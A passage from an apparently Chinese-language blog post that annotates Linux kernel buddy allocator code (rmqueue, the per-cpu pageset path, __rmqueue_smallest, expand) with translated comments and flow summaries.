class="hljs-keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="hljs-number">1</span> &amp;&amp;<br>    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;<br><span class="hljs-type">int</span> local_nid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若移动到了 remote node（译注：非当前node？）, 则重试，</span><br><span class="hljs-comment"> * 但允许 fragmenting fallbacks. 局部性比避免碎片更加重要。</span><br><span class="hljs-comment"> */</span><br>            <span class="hljs-comment">// 比对当前 zone 是否在 local node（就是离当前CPU最近那个 node）</span><br>            <span class="hljs-comment">// 若否，则去掉 ALLOC_NOFRAGMENT 标志位，并从 preferred zone 开始重试。</span><br>            <span class="hljs-comment">// 即：kernel 更倾向于优先从 local zone 进行分配，哪怕会产生内存碎片</span><br>local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);<br><span class="hljs-keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// 获取当前 zone 的水位线标记</span><br>mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);<br><span class="hljs-keyword">if</span> (!zone_watermark_fast(zone, order, mark,<br>       ac-&gt;highest_zoneidx, alloc_flags,<br>       gfp_mask)) &#123; <span class="hljs-comment">// 水位线相关操作</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 该 zone 的水位线失败, 但若其包含了 deferred pages，</span><br><span class="hljs-comment"> * 则我们会看该 zone 是否还能再进行扩展</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* Checked here to keep the fast path fast */</span><br>BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);<br>            <span class="hljs-comment">// 该标志位意为【不检查水位线】，此时我们直接尝试从该 zone 中分配</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">if</span> (node_reclaim_mode == <span class="hljs-number">0</span> ||<br>    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))<br><span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// 首先进行页面回收，之后查看是否满足水位线要求，若‘</span><br>            <span class="hljs-comment">// 不扫描/没有可回收/检查未通过</span><br>            <span class="hljs-comment">// 则都会进行下一次迭代，尝试下一个 zone</span><br>ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_NOSCAN:<br><span class="hljs-comment">/* 不扫描 */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_FULL:<br><span class="hljs-comment">/* 扫描了但不可回收 */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">/* 检查我们是否回收了足够页面 */</span><br><span class="hljs-keyword">if</span> (zone_watermark_ok(zone, order, mark,<br>ac-&gt;highest_zoneidx, alloc_flags))<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>try_this_zone:<br>        <span class="hljs-comment">// 来到该 label 表示我们终于通过了前面一系列的各种检查，现在开始正式进行页面分配</span><br>        <span class="hljs-comment">// **************************</span><br>        <span class="hljs-comment">// rmqueue() 即为我们在OS教科书上看到的的 buddy system 模型,</span><br>        <span class="hljs-comment">// 取 freelist 对应下标 page，若无则向上遍历拆更高 order 的 page</span><br>        <span class="hljs-comment">// **************************</span><br>page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,<br>gfp_mask, alloc_flags, ac-&gt;migratetype);<br><span class="hljs-keyword">if</span> (page) &#123;<br>prep_new_page(page, order, gfp_mask, alloc_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若这是一个高阶的原子分配，</span><br><span class="hljs-comment"> * 检查我们是否该为将来保留 pageblock</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))<br>reserve_highatomic_pageblock(page, zone, order);<br><br><span class="hljs-keyword">return</span> page;<span class="hljs-comment">// 取到了，返回</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 没取到</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/* 若该 zone 有 deferred pages，再试一遍 */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在一台 UMA 机器上可能所以的 zone 都是破碎的，</span><br><span class="hljs-comment"> * 若避免碎片, 重置并重试.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (no_fallback) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数流程总结如下：</p><ul><li><p><code>for_next_zone_zonelist_nodemask</code> 迭代遍历分配上下文中 zonelist 中的 zoneref 数组 对应的 zone</p><blockquote><p>其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</p><ul><li>在 nodemask 的 zone 中，以当前 zone 作为起点游标的【位于或低于】highest_zoneidx 的下一个 zone</li></ul></blockquote><ul><li><p>若开启了 cpuset，检查当前 zone 是否满足 cpuset 的要求，若否，则尝试下一个 zone</p></li><li><p>检查当前 zone 对应 node 的脏页数量是否超出限制，若否，则尝试下一个 zone</p></li><li><p>若 <code>ALLOC_NOFRAGMENT</code> 但是当前 zone 非 preferred zone、且对应 node 为 remote node，则清除该标志位后<strong>重新开始分配</strong>，因为 locality 比避免碎片更加重要</p></li><li><p>获取当前 zone 的水位线标记</p><ul><li>若是设置了 <code>ALLOC_NO_WATERMARKS</code> 则直接到下一步进行分配</li><li>若水位线检查未通过，调用 <code>node_reclaim()</code> 进行页面回收</li><li>若回收后页面还是不足，则尝试下一个 zone</li></ul></li><li><p>调用 <code>rmqueue()</code> 正式进行内存分配，该函数即为 buddy system 分配算法</p></li></ul></li></ul><p><img src="https://s2.loli.net/2022/07/05/SJMKys31ofnTPXc.png" alt="偷的图.png"></p><h4 id="rmqueue-：从给定的-page-中进行页面分配"><a href="#rmqueue-：从给定的-page-中进行页面分配" class="headerlink" title="rmqueue()：从给定的 page 中进行页面分配"></a>rmqueue()：从给定的 page 中进行页面分配</h4><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是从给定 zone 中进行内存分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 从给定 zone 中进行内存分配. 对于 order-0 的分配则使用 pcplists.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span><br><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfp_flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (likely(order == <span class="hljs-number">0</span>)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_MOVABLE 的 pcplist 可能在 CMA 区域有着页面，</span><br><span class="hljs-comment"> * 当从 CMA 的分配不被允许时我们需要略过它</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 对于 order-0 的分配，</span><br>        <span class="hljs-comment">// 若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE</span><br>        <span class="hljs-comment">// 则先从 pcplist 上分配</span><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||<br>migratetype != MIGRATE_MOVABLE) &#123;<br>page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们绝不希望 callers 尝试</span><br><span class="hljs-comment"> * 在带有 __GFP_NOFAIL 时分配大于 order-1 的页</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="hljs-number">1</span>));<br>spin_lock_irqsave(&amp;zone-&gt;lock, flags);<br><br><span class="hljs-keyword">do</span> &#123;<br>page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若由于非CMA的分配上下文导致略过了 pcplist，则order-0 的请求可以到达此处.</span><br><span class="hljs-comment"> * HIGHATOMIC 区域为更高 order 的原子分配所保留，</span><br><span class="hljs-comment"> * 故 order-0 的请求应略过它。</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 若 order &gt; 0 且带有 ALLOC_HARDER 标志位，调用 __rmqueue_smallest() 分配</span><br>        <span class="hljs-comment">// 这个标志位意为将水位线减去 1/4，实际上 GFP_ATOMIC 中便会包含该标志位</span><br><span class="hljs-keyword">if</span> (order &gt; <span class="hljs-number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;<br>page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br>&#125;<br>        <span class="hljs-comment">// 调用 __rmqueue() 进行分配，这个就是真正的核心分配函数了</span><br><span class="hljs-keyword">if</span> (!page)<br>page = __rmqueue(zone, order, migratetype, alloc_flags);<br>&#125; <span class="hljs-keyword">while</span> (page &amp;&amp; check_new_pages(page, order)); <span class="hljs-comment">// 这个检查函数通过了返回false</span><br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">goto</span> failed;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>  get_pcppage_migratetype(page));<br><br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span> &lt;&lt; order);<br>zone_statistics(preferred_zone, zone);<br>local_irq_restore(flags);<br><br>out:<br><span class="hljs-comment">/* Separate test+clear to avoid unnecessary atomics */</span><br><span class="hljs-keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;<br>clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);<br>wakeup_kswapd(zone, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, zone_idx(zone));<br>&#125;<br><br>VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);<br><span class="hljs-keyword">return</span> page;<br><br>failed:<br>local_irq_restore(flags);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析函数流程前我们先回顾一下这个概念——<code>per-cpu pageset</code> ，这是 zone 上的一个 per-cpu 的页面集，在分配时会优先从这里进行分配</p><p>该函数其实还是对分配的核心逻辑的封装，主要是以下流程：</p><ul><li>分配的 order 为 0，若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE，则尝试从 per-cpu pageset 中分配并返回</li><li>order &gt; 0，调用 <code>__rmqueue_smallest()</code> 进行页面分配</li><li>之前未分配成功，调用 <code>__rmqueue()</code> 进行页面分配</li><li>结果检查，其中循环内是用 <code>check_new_pages()</code>，未通过则重新循环（回到第二步）</li></ul><h5 id="①-rmqueue-pcplist-：从-per-cpu-pageset-上做-order-0-的分配"><a href="#①-rmqueue-pcplist-：从-per-cpu-pageset-上做-order-0-的分配" class="headerlink" title="① rmqueue_pcplist()：从 per-cpu pageset 上做 order-0 的分配"></a>① rmqueue_pcplist()：从 per-cpu pageset 上做 order-0 的分配</h5><p>主要是关中断→页面分配→开中断三步走，最后分配调用到的是 <code>__rmqueue_pcplist()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Lock and remove page from the per-cpu list */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">rmqueue_pcplist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *preferred_zone,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">gfp_t</span> gfp_flags,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>local_irq_save(flags); <span class="hljs-comment">// 关中断</span><br>pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;<br><span class="hljs-built_in">list</span> = &amp;pcp-&gt;lists[migratetype]; <span class="hljs-comment">// 获取迁移类型链表</span><br>page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="hljs-built_in">list</span>); <span class="hljs-comment">// 分配</span><br><span class="hljs-keyword">if</span> (page) &#123;<br>__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="hljs-number">1</span>);<br>zone_statistics(preferred_zone, zone);<br>&#125;<br>local_irq_restore(flags); <span class="hljs-comment">// 开中断</span><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__rmqueue_pcplist()</code> 主要就是一个大循环，若 pcplist 为空则调用 <code>rmqueue_bulk()</code> 先从 zone 上拿 pages，之后就是简单的链表脱链，分配结果使用 <code>check_new_page()</code> 进行检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 从 per-cpu 链表上取出 page, 调用者必须保护链表 */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_pcplist</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">per_cpu_pages</span> *<span class="hljs-title">pcp</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">list</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (list_empty(<span class="hljs-built_in">list</span>)) &#123; <span class="hljs-comment">// list 是空的</span><br>            <span class="hljs-comment">// </span><br>pcp-&gt;count += rmqueue_bulk(zone, <span class="hljs-number">0</span>,<br>READ_ONCE(pcp-&gt;batch), <span class="hljs-built_in">list</span>,<br>migratetype, alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(list_empty(<span class="hljs-built_in">list</span>)))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>        <span class="hljs-comment">// 链表脱链</span><br>page = list_first_entry(<span class="hljs-built_in">list</span>, <span class="hljs-keyword">struct</span> page, lru);<br>list_del(&amp;page-&gt;lru);<br>pcp-&gt;count--;<br>&#125; <span class="hljs-keyword">while</span> (check_new_pcp(page));<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>rmqueue_bulk()</code> 则最终会调用到 <code>__rmqueue()</code> 为 pcplist 进行 <code>pcp-&gt;batch</code> 次的 order-0 的页面分配，并建立链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 为了高效率，从 buddy 分配器获得指定数量的元素, </span><br><span class="hljs-comment"> * 所有的单个元素都在持有锁的情况下进行.  将其添加到提供的链表中.</span><br><span class="hljs-comment"> * 返回放置在 *list 链表上的 pages 数量.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rmqueue_bulk</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> count, <span class="hljs-keyword">struct</span> list_head *<span class="hljs-built_in">list</span>,</span><br><span class="hljs-params"><span class="hljs-type">int</span> migratetype, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-type">int</span> i, alloced = <span class="hljs-number">0</span>;<br><br>spin_lock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; count; ++i) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> __rmqueue(zone, order, migratetype,<br>alloc_flags);<br><span class="hljs-keyword">if</span> (unlikely(page == <span class="hljs-literal">NULL</span>))<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">if</span> (unlikely(check_pcp_refill(page)))<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 由 expand() 返回的分割 buddy 页面在此处以物理页框顺序接收。</span><br><span class="hljs-comment"> * 页面被添加到 caller 的链表尾部。从 caller 的角度看，链表在</span><br><span class="hljs-comment"> * 某些情况下是按照页码排序的。这对一些可以从头部前向的IO设备是有用的，</span><br><span class="hljs-comment"> * 因为链表也是在物理页的顺序上的。这对于可以在物理页合理排序的情况下</span><br><span class="hljs-comment"> * 合并IO请求的IO设备是有用的。</span><br><span class="hljs-comment"> */</span><br>list_add_tail(&amp;page-&gt;lru, <span class="hljs-built_in">list</span>);<br>alloced++;<br><span class="hljs-keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))<br>__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,<br>      -(<span class="hljs-number">1</span> &lt;&lt; order));<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * i pages were removed from the buddy list even if some leak due</span><br><span class="hljs-comment"> * to check_pcp_refill failing so adjust NR_FREE_PAGES based</span><br><span class="hljs-comment"> * on i. Do not confuse with &#x27;alloced&#x27; which is the number of</span><br><span class="hljs-comment"> * pages added to the pcp list.</span><br><span class="hljs-comment"> */</span><br>__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));<br>spin_unlock(&amp;zone-&gt;lock);<br><span class="hljs-keyword">return</span> alloced;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="②-rmqueue-smallest-：遍历指定-migrationtype-链表的-buddy-算法（核心中的核心）"><a href="#②-rmqueue-smallest-：遍历指定-migrationtype-链表的-buddy-算法（核心中的核心）" class="headerlink" title="② __rmqueue_smallest()：遍历指定 migrationtype 链表的 buddy 算法（核心中的核心）"></a>② __rmqueue_smallest()：遍历指定 migrationtype 链表的 buddy 算法（核心中的核心）</h5><p>我们重新来回顾一下 <code>free_area</code> 的结构，在其中根据迁移类型分成了多个链表：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><p>而一个 zone 是由多个 <code>free_area</code> 组成的，一个 <code>free_area</code> 对应一个 order，那么对于该函数而言其只会遍历特定的 order，那么就成了下面的模型：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>现在我们可以以来看这个函数了：从待分配 order 所对应的 <code>free_area</code> 的指定的 migration type 链表上分配，若不够则一直向更高 order 进行分配后对半向下拆到低 order，这里向更高 order 分配是通过简单的循环 + 链表脱链操作完成的，而拆高阶 page 的操作则是通过 <code>expand()</code> 完成的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对给定的 migrationtype 遍历 free lists </span><br><span class="hljs-comment"> * 并从 freelists 上移除最小可用的页面</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_smallest</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> current_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> *<span class="hljs-title">area</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-comment">/* 在 preferred list 上寻找一个合适 size 的 page */</span><br><span class="hljs-keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;<br>area = &amp;(zone-&gt;free_area[current_order]);<br>page = get_page_from_free_area(area, migratetype);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">continue</span>;<br>del_page_from_free_list(page, zone, current_order);<br>expand(zone, page, order, current_order, migratetype);<br>set_pcppage_migratetype(page, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>expand()</code> 的逻辑就比较简单，从高阶 order 一直循环到待分配的 order：</p><ul><li>首先高阶 order–，之后页面拆两半，把后半部分挂到链表上，前半部分留到下次循环继续拆</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 此处再分割的顺序对 IO subsystem 而言是十分重要的.</span><br><span class="hljs-comment"> * 请不要在有好的理由及回归测试前改变这个顺序。</span><br><span class="hljs-comment"> * 特别地，当大块的内存被分割，更小块（内存）被传递的顺序</span><br><span class="hljs-comment"> * 则由他们在该函数中被分割的顺序决定。</span><br><span class="hljs-comment"> * 根据实际测试，这是影响传递给IO子系统的 pages 顺序的主要因素，</span><br><span class="hljs-comment"> * 考虑到包含一个内存大块（由一系列小的分配作用）的 buddy system 的行为，</span><br><span class="hljs-comment"> * 